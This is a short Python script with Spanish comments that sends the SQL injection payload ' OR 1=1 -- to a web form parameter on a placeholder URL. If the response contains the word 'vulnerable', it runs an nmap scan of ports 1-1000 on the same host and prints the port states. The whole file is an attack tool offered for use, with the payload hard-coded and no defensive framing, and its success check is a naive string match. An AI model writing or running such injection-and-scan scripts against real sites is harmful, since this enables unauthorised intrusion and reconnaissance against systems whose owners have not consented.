import requests
import nmap

def exploit_and_scan(url, payload):
    # Enviar la solicitud con el payload
    response = requests.post(url, data={'param': payload})

    # Verificar si el payload ha sido exitoso (ajusta esta lógica según tu caso)
    if "vulnerable" in response.text:
        print("Payload exitoso!")

        # Realizar el escaneo Nmap
        nm = nmap.PortScanner()
        result = nm.scan(url.split('//')[1].split(':')[0], '1-1000')

        # Procesar los resultados del escaneo
        for host in nm.all_hosts():
            print('Host : %s (%s)' % (host, nm[host]['hostname']))
            for proto in nm[host].all_protocols():
                print('--------------------------------------------------')
                print('Protocol : %s' % proto)
                lport = list(nm[host][proto].keys())
                lport.sort()
                for port in lport:
                    print('port %s/tcp : %s' % (port, nm[host][proto][port]['state']))

    else:
        print("Payload fallido.")

# Ejemplo de uso
url = "http://ejemplo.com/vulnerable"
payload = "' OR 1=1 --"
exploit_and_scan(url, payload)